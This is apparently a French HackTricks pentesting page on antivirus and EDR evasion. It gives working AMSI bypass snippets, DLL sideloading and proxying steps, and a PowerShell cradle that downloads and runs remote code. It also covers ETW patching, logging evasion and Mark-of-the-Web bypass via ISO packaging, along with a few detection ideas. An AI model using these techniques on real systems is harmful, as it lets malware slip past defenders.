# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Cette page a été écrite par** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot): Un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender): Un outil pour empêcher Windows Defender de fonctionner en se faisant passer pour un autre AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non : static detection, dynamic analysis, et pour les EDR plus avancés, behavioural analysis.

### **Static detection**

La static detection se fait en signalant des chaînes connues ou des séquences d'octets dans un binaire ou un script, et aussi en extrayant des informations depuis le fichier lui-même (par ex. file description, company name, digital signatures, icon, checksum, etc.). Cela signifie que l'utilisation d'outils publics connus peut vous faire repérer plus facilement, puisqu'ils ont probablement déjà été analysés et signalés comme malveillants. Il existe plusieurs façons de contourner ce type de détection :

- **Encryption**

Si vous cryptez le binaire, il n'y aura aucun moyen pour l'AV de détecter votre programme, mais vous aurez besoin d'un loader pour décrypter et exécuter le programme en mémoire.

- **Obfuscation**

Parfois, il suffit de changer certaines chaînes dans votre binaire ou script pour passer à travers l'AV, mais cela peut être chronophage selon ce que vous essayez d'obfusquer.

- **Custom tooling**

Si vous développez vos propres outils, il n'y aura pas de signatures connues, mais cela demande beaucoup de temps et d'efforts.

> [!TIP]
> Une bonne manière de vérifier la static detection de Windows Defender est [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Il découpe essentiellement le fichier en plusieurs segments puis demande à Defender de scanner chacun séparément ; de cette façon, il peut vous indiquer exactement quelles chaînes ou quels octets sont signalés dans votre binary.

Je vous recommande vivement de consulter cette [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sur l'évasion AV pratique.

### **Dynamic analysis**

La dynamic analysis consiste à exécuter votre binaire dans un sandbox et à observer les activités malveillantes (par ex. tenter de décrypter et lire les mots de passe du navigateur, effectuer un minidump sur LSASS, etc.). Cette partie peut être un peu plus délicate, mais voici quelques techniques pour échapper aux sandboxes.

- **Sleep before execution** Selon la manière dont c'est implémenté, cela peut être un excellent moyen de contourner la dynamic analysis des AV. Les AV disposent d'un temps très court pour analyser les fichiers afin de ne pas interrompre le flux de travail de l'utilisateur, donc utiliser des sleeps longs peut perturber l'analyse des binaires. Le problème est que de nombreux sandboxes des AV peuvent simplement sauter le sleep selon l'implémentation.
- **Checking machine's resources** Habituellement, les Sandboxes disposent de très peu de ressources (par ex. < 2GB RAM), sinon ils risqueraient de ralentir la machine de l'utilisateur. Vous pouvez aussi être très créatif ici, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs ; tout ne sera pas implémenté dans le sandbox.
- **Machine-specific checks** Si vous voulez cibler un utilisateur dont la station de travail est jointe au domaine "contoso.local", vous pouvez vérifier le domaine de l'ordinateur pour voir s'il correspond à celui spécifié ; si ce n'est pas le cas, vous pouvez faire quitter votre programme.

Il s'avère que le nom d'ordinateur du Sandbox de Microsoft Defender est HAL9TH, donc vous pouvez vérifier le nom de l'ordinateur dans votre malware avant la détonation ; si le nom correspond à HAL9TH, cela signifie que vous êtes à l'intérieur du sandbox de Defender, vous pouvez donc faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Voici quelques autres excellents conseils de [@mgeeky](https://twitter.com/mariuszbit) pour contrer les Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme dit précédemment dans ce post, les outils publics finiront par être détectés, donc vous devriez vous poser la question suivante :

Par exemple, si vous voulez dumper LSASS, avez-vous vraiment besoin d'utiliser mimikatz ? Ou pourriez-vous utiliser un autre projet moins connu qui fait aussi le dump de LSASS.

La bonne réponse est probablement la seconde. Prenons mimikatz en exemple : c'est probablement l'un des projets, si ce n'est le plus, signalés par les AV et EDR ; bien que le projet soit super intéressant, c'est aussi un cauchemar pour contourner les AV, donc cherchez des alternatives pour ce que vous voulez accomplir.

> [!TIP]
> Lorsque vous modifiez vos payloads pour l'évasion, assurez-vous de désactiver la soumission automatique d'échantillons dans Defender, et s'il vous plaît, sérieusement, **DO NOT UPLOAD TO VIRUSTOTAL** si votre objectif est d'obtenir de l'évasion sur le long terme. Si vous voulez vérifier si votre payload est détecté par un AV particulier, installez-le sur une VM, essayez de désactiver la soumission automatique d'échantillons, et testez-y jusqu'à être satisfait du résultat.

## EXEs vs DLLs

Chaque fois que c'est possible, priorisez toujours l'utilisation de DLLs pour l'évasion ; d'après mon expérience, les fichiers DLL sont généralement beaucoup moins détectés et analysés, donc c'est une astuce très simple à utiliser pour éviter la détection dans certains cas (si votre payload peut s'exécuter en tant que DLL, bien sûr).

Comme on peut le voir sur cette image, un payload DLL de Havoc a un taux de détection de 4/26 sur antiscan.me, tandis que le payload EXE a un taux de détection de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nous allons maintenant montrer quelques astuces que vous pouvez utiliser avec des fichiers DLL pour être beaucoup plus furtif.

## DLL Sideloading & Proxying

**DLL Sideloading** exploite l'ordre de recherche des DLL utilisé par le loader en positionnant l'application victime et le(s) payload(s) malveillant(s) côte à côte.

Vous pouvez chercher des programmes susceptibles au DLL Sideloading en utilisant [Siofra](https://github.com/Cybereason/siofra) et le script powershell suivant :
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Cette commande affichera la liste des programmes susceptibles d'être victimes de DLL hijacking à l'intérieur de "C:\Program Files\\" et les fichiers DLL qu'ils tentent de charger.

Je vous recommande vivement d'**explorer vous-même les programmes DLL Hijackable/Sideloadable**, cette technique est assez furtive si elle est bien exécutée, mais si vous utilisez des programmes Sideloadable connus publiquement, vous pouvez facilement vous faire attraper.

Simplement placer une DLL malveillante portant le nom attendu par un programme ne chargera pas forcément votre payload, car le programme attend certaines fonctions spécifiques dans cette DLL ; pour résoudre ce problème, nous allons utiliser une autre technique appelée **DLL Proxying/Forwarding**.

**DLL Proxying** transfère les appels qu'un programme effectue depuis la DLL proxy (malveillante) vers la DLL originale, préservant ainsi la fonctionnalité du programme et permettant d'exécuter votre payload.

J'utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j'ai suivies:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous donnera 2 fichiers : un modèle de code source DLL, et la DLL originale renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Les deux, notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) et le proxy DLL affichent un taux de détection 0/26 sur [antiscan.me](https://antiscan.me) ! Je qualifierais cela de succès.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je vous recommande **vivement** de regarder [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sur le DLL Sideloading et également [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) pour en apprendre davantage sur ce que nous avons abordé plus en profondeur.

### Abuser des Forwarded Exports (ForwardSideLoading)

Windows PE modules peuvent exporter des fonctions qui sont en réalité des "forwarders" : au lieu de pointer vers du code, l'entrée d'export contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Quand un appelant résout l'export, le loader Windows va :

- Charger `TargetDll` s'il n'est pas déjà chargé
- Résoudre `TargetFunc` à partir de celui-ci

Comportements clés à comprendre :
- Si `TargetDll` est un KnownDLL, il est fourni depuis l'espace de noms protégé KnownDLLs (par ex., ntdll, kernelbase, ole32).
- Si `TargetDll` n'est pas un KnownDLL, l'ordre normal de recherche des DLL est utilisé, qui inclut le répertoire du module qui effectue la résolution du forward.

Ceci permet une primitive de sideloading indirecte : trouvez une DLL signée qui exporte une fonction forwardée vers un nom de module non KnownDLL, puis placez cette DLL signée dans le même répertoire qu'une DLL contrôlée par l'attaquant portant exactement le même nom que le module cible forwardé. Quand l'export forwardé est invoqué, le loader résout le forward et charge votre DLL depuis le même répertoire, exécutant votre DllMain.

Exemple observé sur Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` n'est pas un KnownDLL, il est donc résolu via l'ordre de recherche normal.

PoC (copier-coller) :
1) Copier la DLL système signée dans un dossier accessible en écriture.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Placez un `NCRYPTPROV.dll` malveillant dans le même dossier. Un `DllMain` minimal suffit pour obtenir l'exécution de code ; il n'est pas nécessaire d'implémenter la fonction forwardée pour déclencher `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Déclencher le forward avec un LOLBin signé:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signé) charge le side-by-side `keyiso.dll` (signé)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le loader suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le loader charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n'est pas implémentée, vous obtiendrez une erreur "missing API" uniquement après l'exécution de `DllMain`

Hunting tips:
- Concentrez-vous sur les exports forwardés dont le module cible n'est pas un KnownDLL. KnownDLLs are listed under `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les exports forwardés avec des outils tels que:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consultez l'inventaire des forwarders Windows 11 pour rechercher des candidats : https://hexacorn.com/d/apis_fwd.txt

Idées de détection/défense :
- Surveiller les LOLBins (par ex., rundll32.exe) chargeant des DLL signées depuis des chemins non-système, suivies du chargement de non-KnownDLLs ayant le même nom de base depuis ce répertoire
- Alerter sur des chaînes processus/module comme : `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` sous des chemins accessibles en écriture par l'utilisateur
- Appliquer des politiques d'intégrité du code (WDAC/AppLocker) et interdire write+execute dans les répertoires d'application

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'évasion est simplement un jeu du chat et de la souris : ce qui fonctionne aujourd'hui peut être détecté demain, donc ne comptez jamais sur un seul outil ; si possible, essayez d'enchaîner plusieurs techniques d'évasion.

## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour prévenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". À l'origine, les AV ne pouvaient scanner que les **fichiers sur disque**, donc si vous pouviez d'une manière ou d'une autre exécuter des payloads **directement en mémoire**, l'AV ne pouvait rien faire pour l'empêcher, car il n'avait pas suffisamment de visibilité.

La fonctionnalité AMSI est intégrée dans ces composants de Windows.

- User Account Control, or UAC (élévation de EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, utilisation interactive, et évaluation dynamique de code)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Elle permet aux solutions antivirus d'inspecter le comportement des scripts en exposant le contenu des scripts sous une forme non chiffrée et non obfusquée.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez comment il préfixe `amsi:` puis le chemin vers l'exécutable à partir duquel le script a été lancé, dans ce cas powershell.exe

Nous n'avons déposé aucun fichier sur le disque, mais nous nous sommes tout de même fait repérer en mémoire à cause d'AMSI.

De plus, à partir de **.NET 4.8**, le code C# est également analysé par AMSI. Cela affecte même `Assembly.Load(byte[])` pour charger et exécuter en mémoire. C'est pourquoi il est recommandé d'utiliser des versions plus anciennes de .NET (comme 4.7.2 ou inférieures) pour l'exécution en mémoire si vous souhaitez contourner AMSI.

Il existe quelques manières de contourner AMSI :

- **Obfuscation**

Comme AMSI fonctionne principalement avec des détections statiques, modifier les scripts que vous essayez de charger peut être une bonne façon d'éviter la détection.

Cependant, AMSI a la capacité de déobfusquer les scripts même s'ils ont plusieurs couches, donc l'obfuscation peut être une mauvaise option selon la manière dont elle est faite. Cela rend l'évasion moins évidente. Toutefois, parfois, il suffit de changer quelques noms de variables et tout ira bien, donc cela dépend de la sévérité du flag.

- **AMSI Bypass**

Puisque AMSI est implémenté en chargeant une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est possible de le manipuler facilement même en étant un utilisateur non privilégié. En raison de ce défaut dans l'implémentation d'AMSI, des chercheurs ont trouvé plusieurs façons d'échapper au scanning AMSI.

**Forcing an Error**

Forcer l'initialisation d'AMSI à échouer (amsiInitFailed) aura pour conséquence qu'aucune analyse ne sera initiée pour le processus courant. À l'origine, cela a été divulgué par [Matt Graeber](https://twitter.com/mattifestation) et Microsoft a développé une signature pour empêcher une utilisation plus large.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tout ce qu'il a fallu, c'est une ligne de code powershell pour rendre AMSI inutilisable pour le processus powershell en cours. Cette ligne a bien sûr été repérée par AMSI lui-même, donc une modification est nécessaire pour utiliser cette technique.

Voici un AMSI bypass modifié que j'ai pris depuis ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Gardez à l'esprit que cela sera probablement signalé une fois que cette publication sera publiée, donc vous ne devriez pas publier de code si votre objectif est de rester indétecté.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Veuillez lire [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Supprimer la signature détectée**

Vous pouvez utiliser un outil tel que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus courant. Cet outil fonctionne en scannant la mémoire du processus courant à la recherche de la signature AMSI puis en l'écrasant avec des instructions NOP, la supprimant effectivement de la mémoire.

**Produits AV/EDR qui utilisent AMSI**

Vous pouvez trouver une liste de produits AV/EDR qui utilisent AMSI dans **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser Powershell version 2**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être analysés par AMSI. Vous pouvez faire ceci:
```bash
powershell.exe -version 2
```
## Journalisation PowerShell

La journalisation PowerShell est une fonctionnalité qui permet d'enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile pour l'audit et le dépannage, mais cela peut aussi être un **problème pour les attaquants qui veulent échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Disable PowerShell Transcription and Module Logging**: Vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cette fin.
- **Use Powershell version 2**: Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être analysés par AMSI. Faites : `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Utilisez [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour lancer une session PowerShell sans défenses (c'est ce que `powerpick` de Cobalt Strike utilise).


## Obfuscation

> [!TIP]
> Plusieurs techniques d'obfuscation reposent sur le chiffrement des données, ce qui augmente l'entropie du binaire et facilite la détection par les AVs et EDRs. Faites attention à cela et appliquez éventuellement le chiffrement uniquement aux sections sensibles de votre code qui doivent rester cachées.

### Déobfuscation des binaires .NET protégés par ConfuserEx

Lors de l'analyse de malware utilisant ConfuserEx 2 (ou des forks commerciaux), il est courant de faire face à plusieurs couches de protection qui bloquent les décompilateurs et les sandboxes. Le flux de travail ci‑dessous restaure de manière fiable un IL quasi‑original qui peut ensuite être décompilé en C# dans des outils tels que dnSpy ou ILSpy.

1.  Suppression de l'anti-tamper – ConfuserEx chiffre chaque *method body* et le déchiffre à l'intérieur du constructeur statique du *module* (`<Module>.cctor`). Il modifie aussi le checksum PE de sorte que toute modification plante le binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`) qui peuvent être utiles pour construire votre propre unpacker.

2.  Récupération des symboles / du contrôle de flux – fournissez le fichier *clean* à **de4dot-cex** (un fork de de4dot conscient de ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags :
• `-p crx` – sélectionne le profil ConfuserEx 2  
• de4dot annulera le flattening du contrôle de flux, restaurera les namespaces, classes et noms de variables d'origine et déchiffrera les chaînes constantes.

3.  Retrait des proxy-calls – ConfuserEx remplace les appels directs de méthode par des wrappers légers (a.k.a *proxy calls*) pour compliquer davantage la décompilation. Supprimez-les avec **ProxyCall-Remover** :
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Après cette étape, vous devriez observer des API .NET normales comme `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire résultant sous dnSpy, recherchez de grands blobs Base64 ou l'utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` pour localiser le *vrai* payload. Souvent, le malware le stocke en tant que tableau d'octets encodé TLV initialisé dans `<Module>.byte_0`.

La chaîne ci‑dessus restaure le flux d'exécution **sans** avoir besoin d'exécuter l'échantillon malveillant – utile lorsqu'on travaille sur une station de travail hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute` qui peut être utilisé comme un IOC pour trier automatiquement les échantillons.

#### Commande en une ligne
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscateur C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Le but de ce projet est de fournir un fork open-source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'améliorer la sécurité logicielle via la [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et la protection contre la falsification.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator démontre comment utiliser le langage `C++11/14` pour générer, à la compilation, du code obfusqué sans utiliser d'outil externe et sans modifier le compilateur.
- [**obfy**](https://github.com/fritzone/obfy): Ajoute une couche d'opérations obfusquées générées par le framework de métaprogrammation de templates C++, ce qui rendra la vie de la personne souhaitant craquer l'application un peu plus difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz est un obfuscateur binaire x64 capable d'obfusquer différents fichiers PE, y compris : .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame est un moteur de code métamorphique simple pour exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator est un framework d'obfuscation de code finement granulaire pour les langages supportés par LLVM utilisant ROP (return-oriented programming). ROPfuscator obfusque un programme au niveau du code assembleur en transformant des instructions régulières en chaînes ROP, contrecarrant notre conception naturelle du flux de contrôle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt est un .NET PE Crypter écrit en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor est capable de convertir des EXE/DLL existants en shellcode puis de les charger

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification de l'ADS Zone.Identifier pour un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un certificat de signature **fiable** **ne déclencheront pas SmartScreen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **ne peut pas** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un mécanisme de journalisation puissant sous Windows qui permet aux applications et composants système de **consigner des événements**. Cependant, il peut aussi être utilisé par les produits de sécurité pour surveiller et détecter des activités malveillantes.

De la même manière que AMSI est désactivé (bypassed), il est aussi possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans enregistrer d'événements. Cela se fait en patchant la fonction en mémoire pour qu'elle retourne immédiatement, désactivant ainsi la journalisation ETW pour ce processus.

Vous pouvez trouver plus d'infos dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Charger des binaires C# en mémoire est connu depuis longtemps et reste un excellent moyen d'exécuter vos outils post-exploitation sans être détecté par l'AV.

Puisque le payload sera chargé directement en mémoire sans toucher le disque, il faudra seulement se préoccuper de patcher AMSI pour l'ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) fournissent déjà la capacité d'exécuter des assemblies C# directement en mémoire, mais il existe différentes manières de le faire :

- **Fork\&Run**

Cela implique de **lancer un nouveau processus sacrificiel**, d'injecter votre code malveillant post-exploitation dans ce nouveau processus, d'exécuter votre code malveillant et, une fois terminé, de tuer le nouveau processus. Cela a des avantages et des inconvénients. L'avantage de la méthode fork-and-run est que l'exécution se produit **en dehors** du processus de notre implant Beacon. Cela signifie que si quelque chose dans notre action post-exploitation tourne mal ou est détecté, il y a une **bien meilleure chance** que notre **implant survive.** L'inconvénient est que vous avez une **plus grande probabilité** d'être détecté par les **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Il s'agit d'injecter le code malveillant post-exploitation **dans son propre processus**. Ainsi, vous évitez de créer un nouveau processus qui serait scanné par l'AV, mais l'inconvénient est que si quelque chose tourne mal lors de l'exécution de votre payload, il y a une **bien plus grande probabilité** de **perdre votre beacon** car il pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si vous voulez en savoir plus sur le chargement d'Assemblies C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez aussi charger des Assemblies C# **depuis PowerShell**, regardez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la vidéo de S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant en utilisant d'autres langages en donnant à la machine compromise l'accès **à l'environnement interpréteur installé sur le partage SMB contrôlé par l'attaquant**.

En autorisant l'accès aux binaires de l'interpréteur et à l'environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** de la machine compromise.

Le repo indique : Defender scanne toujours les scripts, mais en utilisant Go, Java, PHP, etc., nous avons **plus de flexibilité pour bypasser les signatures statiques**. Des tests avec des reverse shell scripts non obfusqués aléatoires dans ces langages se sont avérés fructueux.

## TokenStomping

Token stomping est une technique qui permet à un attaquant de **manipuler le jeton d'accès ou un produit de sécurité comme un EDR ou un AV**, leur permettant de réduire ses privilèges de sorte que le processus ne meure pas mais n'ait pas les permissions pour vérifier des activités malveillantes.

Pour prévenir cela, Windows pourrait **empêcher les processus externes** d'obtenir des handles sur les tokens des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
